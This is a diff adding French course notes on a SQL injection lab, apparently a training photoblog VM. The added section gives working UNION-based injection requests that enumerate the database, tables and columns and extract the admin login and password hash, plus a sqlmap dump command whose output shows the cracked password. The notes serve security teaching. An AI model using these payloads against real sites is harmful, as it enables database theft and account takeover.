@@ -87,3 +87,55 @@ Objectif : obtenir un shell sur la machine.
 1. Faire un scan de port
 2. Lancer gobuster, et nikto (cf cours reconnaissance)
 3. Rechercher des failles à exploiter
+
+
+## Exploitation SLQi
+
+### À la main
+
+Trouver la version :\
+`GET /cat.php?id=2+UNION+SELECT+NULL,@@version,NULL,NULL+LIMIT+1,1`
+
+
+Trouver les bases de données :\
+`GET /cat.php?id=2+UNION+SELECT+NULL,group_concat(0x7c,schema_name,0x7c),NULL,NULL+FROM+information_schema.schemata+LIMIT+1,1`
+
+    Picture: |information_schema|,|photoblog|
+
+Trouver les tables :\
+`GET /cat.php?id=2+UNION+SELECT+NULL,group_concat(0x7c,table_name,0x7c),NULL,NULL+FROM+information_schema.tables+WHERE+table_schema='photoblog'+LIMIT+1,1`
+
+    Picture: |categories|,|pictures|,|users|
+
+
+Trouver les colonnes :\
+`GET /cat.php?id=2+UNION+SELECT+NULL,group_concat(0x7c,column_name,0x7c),NULL,NULL+FROM+information_schema.columns+WHERE+table_name='users'+LIMIT+1,1 `
+
+    Picture: |id|,|login|,|password|
+
+Extraire des données :
+`GET /cat.php?id=2+UNION+SELECT+NULL,group_concat(login,':',password),NULL,NULL+FROM+users+LIMIT+1,1`
+
+    Picture: admin:8efe310f9ab3efeae8d410a8e0166eb2
+
+### SQLmap
+
+```bash
+$ sqlmap -u "http://192.168.56.6/cat.php?id=1*" --batch --level=5 --risk=3 --dump
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+
+
+[10:44:44] [INFO] cracked password 'P4ssw0rd' for user 'admin'                                                                                                               
+Database: photoblog                                                                                                                                                          
+Table: users
+[1 entry]
++----+-------+---------------------------------------------+
+| id | login | password                                    |
++----+-------+---------------------------------------------+
+| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
++----+-------+---------------------------------------------+
+```
